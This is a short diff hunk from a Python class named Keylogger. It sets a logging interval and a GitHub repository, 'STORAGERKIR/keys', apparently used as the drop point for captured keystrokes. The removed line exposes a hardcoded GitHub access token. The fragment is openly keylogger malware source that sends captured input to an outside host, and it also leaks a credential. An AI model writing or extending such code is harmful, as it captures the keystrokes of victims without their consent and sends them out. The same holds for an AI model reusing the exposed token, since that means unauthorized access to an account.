@@ -16,7 +16,7 @@ class Keylogger:
         self.interval = 30  # Changed to 30 seconds
         self.log = ""
         self.github_repo = "STORAGERKIR/keys"
-        self.github_token = "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"
+        self.github_token = "" 
         
         try:
             print("Initializing keylogger...")
